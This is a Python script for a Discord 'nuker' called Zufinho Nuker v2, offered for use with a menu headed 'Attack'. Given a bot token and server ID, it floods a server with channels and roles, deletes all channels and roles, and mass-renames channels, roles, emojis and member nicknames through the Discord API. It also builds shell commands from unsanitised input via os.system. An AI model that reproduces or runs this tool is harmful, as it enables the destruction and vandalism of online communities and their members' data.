#scripted by zufinho (again)
#now becomming more faster and more organized
import os
import time
from pystyle import Colorate,Colors
import time
import requests
banner="""

███████╗██╗░░░██╗███████╗██╗███╗░░██╗██╗░░██╗░█████╗░  ███╗░░██╗██╗░░░██╗██╗░░██╗███████╗██████╗░
╚════██║██║░░░██║██╔════╝██║████╗░██║██║░░██║██╔══██╗  ████╗░██║██║░░░██║██║░██╔╝██╔════╝██╔══██╗
░░███╔═╝██║░░░██║█████╗░░██║██╔██╗██║███████║██║░░██║  ██╔██╗██║██║░░░██║█████═╝░█████╗░░██████╔╝
██╔══╝░░██║░░░██║██╔══╝░░██║██║╚████║██╔══██║██║░░██║  ██║╚████║██║░░░██║██╔═██╗░██╔══╝░░██╔══██╗
███████╗╚██████╔╝██║░░░░░██║██║░╚███║██║░░██║╚█████╔╝  ██║░╚███║╚██████╔╝██║░╚██╗███████╗██║░░██║
╚══════╝░╚═════╝░╚═╝░░░░░╚═╝╚═╝░░╚══╝╚═╝░░╚═╝░╚════╝░  ╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝

██╗░░░██╗██████╗░
██║░░░██║╚════██╗
╚██╗░██╔╝░░███╔═╝
░╚████╔╝░██╔══╝░░
░░╚██╔╝░░███████╗
░░░╚═╝░░░╚══════╝
"""
version="alpha 1.8 - v2"
def printcolor(text):
    print(Colorate.Horizontal(Colors.purple_to_blue,text,1))
#varivbles importants
guildverified=0
cango=0
count=0
while True:
    os.system("cls")
    printcolor(banner)
    print()
    print()
    printcolor(version)
    print()
    printcolor("Digit the token bot:")
    token=input(Colorate.Horizontal(Colors.purple_to_blue,">",1))
    #verify if bot token is valid
    tokenverify = requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": f"Bot {token}"})
    if tokenverify.status_code==200:
        while True:
            os.system("cls")
            printcolor(banner)
            print()
            print()
            printcolor(version)
            print()
            printcolor("Digit the guild id:")
            guildid=input(Colorate.Horizontal(Colors.purple_to_blue,">",1))
            #verify if bot in guild
            guildverify=requests.get("https://discord.com/api/v9/users/@me/guilds", headers={"Authorization": f"Bot {token}"})
            for guild in guildverify.json():
                if guild['id']==guildid:
                    guildverified=1
                    break
            else:
                printcolor("Bot not is in guild")
                time.sleep(3)
            if guildverified==1:
                break
    else:
        printcolor("insert a valid token")
        time.sleep(3)
    if guildverified==1:
        break
#all ok

#the funcionally nuker 
while True:
    cango=0
    count=0
    os.system("cls")
    printcolor(banner)
    print()
    print()
    printcolor(version)
    print()
    printcolor("--Attack--")
    printcolor("[1] Create Channels         [2] Delete Channels         [3] Create Roles        [4] Delete Roles")
    printcolor("[5] Rename Channels         [6] Rename Roles            [7] Rename User         [8] Rename Emojis")
    print()
    printcolor("--Server Config--")
    cmd=input(Colorate.Horizontal(Colors.purple_to_blue,">",1))
    if cmd=="1":
        #create channels
        printcolor("Name of channel:")
        channelname=input(Colorate.Horizontal(Colors.purple_to_blue,">",1))
        printcolor("Channel type:")
        printcolor("text/voice/category")
        channeltype=input(Colorate.Horizontal(Colors.purple_to_blue,">",1))
        if channeltype.lower()=="text" or channeltype=="":
            channeltype=0
            cango=1
        elif channeltype.lower()=="voice":
            channeltype=2
            cango=1
        elif channeltype.lower()=="category":
            channeltype=4
            cango=1
        else:
            print(Colorate.Color(Colors.red,"type of channel incorrect",1))
            time.sleep(3)
            #creating
        if cango==1:
            printcolor("Amount of channels:")
            amountchannels=int(input(Colorate.Horizontal(Colors.purple_to_blue,">",1)))
            while count<=amountchannels:
                os.system(f"start src/createchannel.pyw {guildid} {token} {channeltype} {channelname}")
                printcolor(f"requested to create {channelname}")
                count=count+1
    elif cmd=="2":
        #delete channels
        getchannels = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/channels", headers={"Authorization": f"Bot {token}"})

        if getchannels.status_code == 200:
            channels = getchannels.json()
            for channel in channels:
                printcolor(f"requested to delete {channel['name']}")
                os.system(f"start src/deletechannel.pyw {token} {channel['id']}")
    elif cmd=="3":
        #role create
        printcolor("Name of role:")
        rolename=input(Colorate.Horizontal(Colors.purple_to_blue,">",1))
        printcolor("Amount of roles:")
        roleamount=int(input(Colorate.Horizontal(Colors.purple_to_blue,">",1)))
        while count<roleamount:
            os.system(f"start src/createrole.pyw {guildid} {token} {rolename}")
            printcolor(f"requested to create {rolename}")
            count=count+1
    elif cmd=="4":
        #role delete
        rolelist=requests.get(f"https://discord.com/api/v9/guilds/{guildid}/roles",headers={"Authorization": f"Bot {token}"})
        if rolelist.status_code==200:
            for role in rolelist.json():
                os.system(f"start src/deleteroles.pyw {guildid} {token} {role['id']}")
                printcolor(f"requested to delete {role['name']}")
                time.sleep(0.55)
    elif cmd=="5":
        #rename channel
        printcolor("New Name:")
        renamechannel=input(Colorate.Horizontal(Colors.purple_to_blue,">",1))
        getchannels = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/channels", headers={"Authorization": f"Bot {token}"})
        for channel in getchannels.json():
            printcolor(f"requested channel {channel['name']} rename to {renamechannel}")
            os.system(f"start src/renamechannels.pyw {channel['id']} {token} {renamechannel}")
    elif cmd=="6":
        #rename role
        printcolor("New Name:")
        renamerole=input(Colorate.Horizontal(Colors.purple_to_blue,">",1))
        getroles = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/roles", headers={"Authorization": f"Bot {token}"})
        for role in getroles.json():
            printcolor(f"requested role {role['name']} rename to {renamerole}")
            os.system(f"start src/renameroles.pyw {guildid} {token} {role['id']} {renamerole}")
    elif cmd=="7":
        #nick name change
        printcolor("New name:")
        nicknamechange=input(Colorate.Horizontal(Colors.purple_to_blue,">",1))
        peoples = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/members?limit=1000", headers={"Authorization": f"Bot {token}"})
        for people in peoples.json():
            printcolor(f"requested user {people['user']['username']} rename to {nicknamechange}")
            os.system(f"start src/changenickname.pyw {guildid} {token} {people['user']['id']} {nicknamechange}")
    elif cmd=="8":
        #emoji name change
        printcolor("New name:")
        emojichangename=input(Colorate.Horizontal(Colors.purple_to_blue,">",1))
        emojis = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/emojis", headers={"Authorization": f"Bot {token}"})
        for emoji in emojis.json():
            printcolor(f"requested change {emoji['name']} rename to {emojichangename}")
            os.system(f"start src/renameemojis.pyw {guildid} {token} {emoji['id']} {emojichangename}")